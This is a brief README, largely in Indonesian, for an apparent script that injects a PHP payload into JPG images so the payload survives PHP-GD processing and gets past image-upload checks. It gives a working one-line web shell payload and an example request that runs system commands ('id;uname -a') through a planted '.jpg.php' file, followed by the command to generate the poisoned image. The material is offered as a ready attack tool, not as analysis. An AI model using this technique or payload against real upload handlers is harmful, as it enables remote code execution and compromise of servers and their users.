# Bypass PHP-GD RCE
#### Bypassing image uploader use PHP-GD
#### Bypassing Via Injecting RCE Code In Image 
##### Perbedaan injeksi PHP GD dengan injeksi seperti exiftool, dan jhead adalah tidak merusak pixel/merubah pixel gambar. 
##### gambar yang di injeksi akan tetap menampilkan gambar, terdeteksi, dan terlihat seperti gambar asli
## Ubah gd.php dan ganti Payload/Kode yang ingin di inject ke gambar di _LINE 8_

```
$miniPayload = 'taruh payloadmu disini';
```
#### contoh payload yang dipake :

```
$miniPayload = '<?=`$_GET[0]`?>';
as
vuln.com/rce.jpg.php?0=id;uname -a
```
## How ?
```
php gd.php sample.jpg
```
#### jika sukses, maka ada file baru bernama payload_sample.jpg

# JPG ONLY !!!
